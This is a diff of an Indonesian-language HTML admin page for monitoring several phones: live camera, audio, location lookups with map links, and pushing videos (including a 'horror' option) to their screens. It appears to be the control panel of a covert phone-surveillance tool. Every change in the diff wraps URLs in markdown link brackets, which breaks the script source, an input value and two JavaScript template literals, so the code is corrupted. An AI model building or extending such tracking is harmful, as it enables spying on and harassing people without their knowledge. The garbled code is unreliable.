@@ -4,7 +4,7 @@
   <meta charset="UTF-8" />
   <meta name="viewport" content="width=device-width, initial-scale=1.0" />
   <title>Admin Multi-HP - Live Kamera, Suara, Lokasi & Push Layar</title>
-  <script src="https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js"></script>
+  <script src="[https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js](https://unpkg.com/peerjs@1.5.4/dist/peerjs.min.js)"></script>
   <style>
     * { box-sizing: border-box; margin: 0; padding: 0; font-family: 'Inter', 'Segoe UI', sans-serif; }
     body { background: #0B1120; color: #F8FAFC; min-height: 100vh; padding: 18px; }
@@ -139,7 +139,7 @@
       <div id="modalVideoFields" class="hidden">
         <div style="margin-bottom:10px;">
           <label class="modal-label" for="vidUrlInput">URL Video (MP4 / WebM)</label>
-          <input id="vidUrlInput" class="modal-input" type="text" value="https://b.top4top.io/m_3975xed1e1.mp4" placeholder="https://.../video.mp4" />
+          <input id="vidUrlInput" class="modal-input" type="text" value="[https://b.top4top.io/m_3975xed1e1.mp4](https://b.top4top.io/m_3975xed1e1.mp4)" placeholder="https://.../video.mp4" />
         </div>
         <label class="modal-row" style="margin-bottom:8px;">
           <input type="checkbox" id="vidHorrorBgCheck" checked />
@@ -398,7 +398,7 @@
       areaPending.add(key);
 
       try {
-        const url = `https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=${encodeURIComponent(lat)}&lon=${encodeURIComponent(lng)}&zoom=14&addressdetails=1`;
+        const url = `[https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=$](https://nominatim.openstreetmap.org/reverse?format=jsonv2&lat=$){encodeURIComponent(lat)}&lon=${encodeURIComponent(lng)}&zoom=14&addressdetails=1`;
         const res = await fetch(url, {
           headers: { "Accept": "application/json" }
         });
@@ -822,7 +822,7 @@
       if (actEl) {
         let mapLink = actEl.querySelector(".map-link");
         if (hasCoords) {
-          const mapUrl = `https://www.google.com/maps?q=${loc.lat},${loc.lng}`;
+          const mapUrl = `[https://www.google.com/maps?q=$](https://www.google.com/maps?q=$){loc.lat},${loc.lng}`;
           if (!mapLink) {
             mapLink = document.createElement("a");
             mapLink.className = "map-link";
